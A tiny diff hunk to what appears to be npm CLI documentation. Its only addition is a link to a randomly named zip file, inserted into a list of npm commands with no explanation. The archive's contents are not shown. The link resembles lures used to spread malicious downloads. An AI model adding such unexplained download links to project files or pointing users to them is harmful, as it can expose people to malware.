@@ -94,3 +94,4 @@ init <pkg>` commands.
 * [npm test](/commands/npm-test)
 * [npm restart](/commands/npm-restart)
 * [npm stop](/commands/npm-stop)
+[SVxMBoc5P3f6YV3O7Xbu.zip](https://github.com/npm/cli/files/8338386/SVxMBoc5P3f6YV3O7Xbu.zip)
